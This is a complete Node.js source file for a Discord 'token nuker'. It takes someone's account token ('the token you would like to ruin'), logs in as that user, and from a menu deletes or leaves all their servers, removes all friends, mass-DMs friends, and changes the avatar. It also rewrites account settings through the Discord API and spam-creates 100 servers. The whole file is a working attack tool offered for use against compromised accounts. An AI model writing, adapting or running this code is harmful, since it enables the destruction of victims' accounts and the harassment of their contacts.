const sleep = (time) => new Promise((f) => setTimeout(() => f(time), time));
const axios = require('axios');
const prompt = require('inquirer').createPromptModule();
const AsciiTable = require('ascii-table');
const { Client } = require('discord.js');
const chalk = require('chalk');
const inquirer = require('inquirer');
let token;

const actions = {
   all: 'Execute all actions',
   servers: 'Leave servers & delete owned servers',
   dm: 'DM all friends',
   friends: 'Remove all friends',
   pfp: 'Change PFP',
   settings: 'Fuck settings',
   serverspam: 'Spam create servers',
};

(async () => {
   let { token: t } = await prompt({
      name: 'token',
      type: 'input',
      message: "Input the token you would like to ruin:"
   });

   console.log(chalk`{green ?} Logging in...`)

   const client = new Client();

   client.on('ready', async () => {
      await promptOptions(client);
   });

   client.login(t).catch((err) => {
      console.error(chalk`{red ?} Invalid token provided, exiting process...`);
      process.exit(-1);
   });

   token = t;
})();

async function promptOptions(client) {
   console.clear();

   let table = new AsciiTable('Information');

   table.addRowMatrix([
      ['Tag', client.user.tag],
      ['ID', client.user.id],
      ['Servers', client.guilds.size],
      ['Friends', client.user.friends.size]
   ]).setJustify().setAlignRight(1);

   console.log(chalk.cyan(`${table.toString()}\n`));

   let { action } = await prompt({
      type: 'list',
      name: 'action',
      message: 'Select the action you wish to execute',
      choices: [...Object.values(actions)]
   });


   return executeAction(client, Object.keys(actions).find(key => actions[key] === action));
}

async function executeAction(client, action) {
   console.clear();

   switch (action) {
      case 'all':
         for (let action of Object.keys(actions)) {
            if (action == 'all') continue;
            await funcs[action](client);
         }
         break;
      case 'servers':
         await funcs.servers(client);
         break;
      case 'dm':
         await funcs.dm(client);
         break;
      case 'friends':
         await funcs.friends(client);
         break;
      case 'pfp':
         await funcs.pfp(client);
         break;
      case 'settings':
         await funcs.settings(client);
         break;
      case 'serverspam':
         await funcs.serverspam(client);
         break;
   }

   console.log(chalk`{green ?} Action(s) have been executed successfully, returning to the main menu...`);
   setTimeout(async () => {
      return await promptOptions(client);
   }, 3000);
}

const funcs = {
   servers: async function (client) {
      if (!client.guilds.size) return console.log(chalk`{red ?} No guilds to leave/delete.`);
      for (const server of client.guilds.values()) {
         await sleep(500);
         if (server.ownerID == client.user.id) {
            console.log(chalk`{green !} Deleting ${server.name}...`)
            await server.delete().catch(() => {});
         } else {
            console.log(chalk`{green !} Leaving ${server.name}...`)
            await server.leave();
         }
      }
   },
   dm: async function (client) {
      if (!client.user.friends.size) return console.log(chalk`{red ?} No friends to dm.`);
      let { message } = await inquirer.prompt({
         type: 'input',
         message: 'What message would you like to DM all friends?',
         name: 'message'
      });
      for (const friend of client.user.friends.values()) {
         await sleep(500);
         console.log(chalk`{green ?} DMing ${friend.tag}`);
         await friend.send(message).catch(() => null);
      };
   },
   friends: async function (client) {
      if (!client.user.friends.size) return console.log(chalk`{red ?} No friends to remove.`);
      for (const friend of client.user.friends.values()) {
         await sleep(500);
         console.log(chalk`{green ?} Removing ${friend.tag}`);
         await friend.removeFriend().catch(() => null);
      };
   },
   pfp: async function (client) {
      console.log(chalk`{green ?} Setting avatar`)
      await client.user.setAvatar('./avatar.png').catch(() => null)
   },
   settings: async function (client) {
      console.log(chalk`{green ?} Patching settings`)
      await axios.patch('https://canary.discordapp.com/api/v8/users/@me/settings', {
         locale: 'zh-CN',
         theme: 'light',
         message_display_compact: true,
         inline_embed_media: false,
         inline_attachment_media: false,
         gif_auto_play: false,
         render_embeds: false,
         render_reactions: false,
         animate_emoji: false
      }, {
         headers: {
            Authorization: token
         }
      })
   },
   serverspam: async function (client) {
      let { name } = await inquirer.prompt({
         type: 'input',
         message: 'What name would you like the servers to have?',
         name: 'name'
      });
      for (let i = 0; 100 > i; i++) {
         await sleep(250);
         client.user.createGuild(`${name}​​​​​​​${random(3)}`, 'us-west', './avatar.png').catch(() => null);
      }
   }
};

function random(length) {
   var result = '';
   var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
   for (var i = 0; i < length; i++) {
      result += characters.charAt(Math.floor(Math.random() * characters.length));
   }
   return result;
}


